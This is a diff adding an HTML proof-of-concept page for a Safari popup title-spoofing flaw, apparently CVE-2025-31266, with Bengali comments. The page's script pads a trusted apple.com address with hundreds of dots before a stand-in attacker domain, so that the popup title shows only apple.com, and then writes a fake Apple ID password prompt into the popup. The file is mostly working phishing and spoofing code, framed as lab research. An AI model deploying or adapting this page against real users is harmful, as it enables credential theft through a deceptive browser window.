@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CVE-2025-31266 Research PoC</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; }
+        button { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #007AFF; color: white; border: none; border-radius: 5px; }
+    </style>
+</head>
+<body>
+
+    <h2>Safari UI Spoofing PoC (CVE-2025-31266)</h2>
+    <p>এই বাটনটি ক্লিক করলে একটি পপ-আপ খুলবে যা ভুলভাবে টাইটেল ডিসপ্লে করতে পারে।</p>
+    
+    <button id="exploitBtn">Trigger Spoof Pop-up</button>
+
+    <script>
+        document.getElementById('exploitBtn').onclick = function() {
+            // ১. একটি লম্বা ডোমেইন নেম যা ট্রানকেশন লজিককে ট্রিগার করবে
+            // রিসার্চ অনুযায়ী, ট্রাস্টেড সাইটটি শুরুতে রেখে অনেক ডট (.) এবং অ্যাটাকার সাইটটি শেষে দেওয়া হয়।
+            const trustedPart = "https://www.apple.com";
+            const padding = ".".repeat(300); // পপ-আপ টাইটেল বারের উইডথ অনুযায়ী ট্রানকেশন পয়েন্ট হিট করা
+            const maliciousPart = "your-attacker-domain.com";
+            
+            const spoofedTitle = trustedPart + padding + maliciousPart;
+
+            // ২. পপ-আপ উইন্ডো খোলা
+            const popup = window.open("", "test_popup", "width=500,height=400");
+
+            if (popup) {
+                // ৩. টাইটেল সেট করা (এখানেই মূল বাগটি কাজ করে)
+                // ভলনারেবল সাফারিতে এটি ট্রানকেট করে শুধু শুরুর 'apple.com' অংশটি দেখাবে
+                popup.document.title = spoofedTitle;
+
+                // ৪. পপ-আপের ভেতরে ফিশিং কন্টেন্ট
+                popup.document.write(`
+                    <div style="text-align:center; padding: 20px;">
+                        <h3>Account Verification Required</h3>
+                        <p>Your session has expired. Please log in to your Apple ID.</p>
+                        <input type="password" placeholder="Password"><br><br>
+                        <button>Sign In</button>
+                        <hr>
+                        <p style="color:red;">Note: Check the window title in Safari < 18.5</p>
+                    </div>
+                `);
+            } else {
+                alert("Pop-up blocked! Please allow pop-ups for this lab.");
+            }
+        };
+    </script>
+
+</body>
+</html>
